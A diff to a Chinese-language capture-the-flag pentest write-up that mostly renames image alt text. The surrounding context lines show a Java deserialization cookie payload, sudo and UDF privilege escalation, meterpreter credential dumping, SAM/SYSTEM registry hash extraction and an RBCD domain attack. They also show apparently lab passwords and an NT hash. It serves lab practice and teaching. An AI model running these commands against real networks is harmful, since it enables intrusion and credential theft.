@@ -15,13 +15,13 @@ tags: ["Pentest"]
 
 先扫描一下，8080端口发现了登录接口，登录进去之后，发现没见过这个系统，可能是自己二开的，抓个包，发现Cookie是Java反序列化一样的payload
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 测试之后发现这条链子可以打
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 ```http
 GET /mail/u/0/ HTTP/1.1
@@ -48,9 +48,9 @@ rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0
 
 链接上去
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 权限不够，最近出了一个sudo提权的漏洞， https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/ 成功得到提权拿到flag1，或者是suid提权
 
@@ -84,7 +84,7 @@ ss -luntp
 
 找到刚才的外网服务的jar包，反编译，获得mysql的用户名和密码
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 ```java
 # THYMELEAF (ThymeleafAutoConfiguration)
@@ -108,7 +108,7 @@ spring.datasource.password=T%b8ds*l3v+B
 
 看这台机器的IP只看到了一个网段，但是这个网段只有一台机器，`netstat -an`查看网络连接情况
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 发现还有这个网段
 
@@ -153,11 +153,11 @@ start vulscan
 
 接着找到了Mysql
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 MDUT链接上去
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 UDF提权之后仍然不是system权限，看到有**SeImpersonatePrivilege**可以利用，准备上线msf，现在生成`bind.exe`
 
@@ -194,7 +194,7 @@ creds_all
 hashdump
 ```
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 wmi没连接上，直接用msf里面的shell功能
 
@@ -219,7 +219,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 run post/windows/gather/credentials/windows_autologin
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 发现自动登录用户
 
@@ -228,7 +228,7 @@ nxc smb 172.16.34.23 -u EthanMorris -p 'DROCV4?LtyCp' --shares
 nxc smb 172.16.34.5 -u EthanMorris -p 'DROCV4?LtyCp' --shares
 ```
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
 发现对**Aoselu FileService**有读写权限，并且是域用户，收集域内信息
 
@@ -249,7 +249,7 @@ cd Ops Scripts
 
 找到很多ps1文件
 
-![1](./assets/013.png)
+![image](./assets/013.png)
 
 下载下来
 
@@ -299,7 +299,7 @@ evil-winrm -i 172.16.34.23 -u svc_bakadm01 -p 'k3!8Fa&Sq8Z6'
 whoami /priv
 ```
 
-![1](./assets/014.png)
+![image](./assets/014.png)
 
 **SeBackupPrivilege**权限，因为这里可不是DC嗷，不能卷影拷贝攻击，但是可以转储注册表
 
@@ -320,7 +320,7 @@ impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
 
 SECURITY 权限不够emm，但是就用system和sam也可以得到管理员的`NThash`了
 
-![1](./assets/015.png)
+![image](./assets/015.png)
 
 ```bash
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:74aaf464e1a7a75f2123ada1dd62edab:::
@@ -349,7 +349,7 @@ ab232c3cf9f4b7cf27602082b04f306b
 
 ## flag4
 
-![1](./assets/016.png)
+![image](./assets/016.png)
 
 这个用户对域控有WriteDacl权限，可以打RBCD，先添加用户给这个主机完全控制权限
 
@@ -379,7 +379,7 @@ impacket-getST aoseluauto.com/'TEST6$':'P@ssw0rd' -spn cifs/ASLSRVAD05.aoseluaut
 
 `KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)`现在又出现了这样的错误，当前模拟的用户`Administrator`被禁用掉了。换任何一个管理员用户都可以
 
-![1](./assets/017.png)
+![image](./assets/017.png)
 
 ```bash
 impacket-getST aoseluauto.com/'TEST6$':'P@ssw0rd' -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate SVC_NETADM02 -dc-ip 172.16.34.5
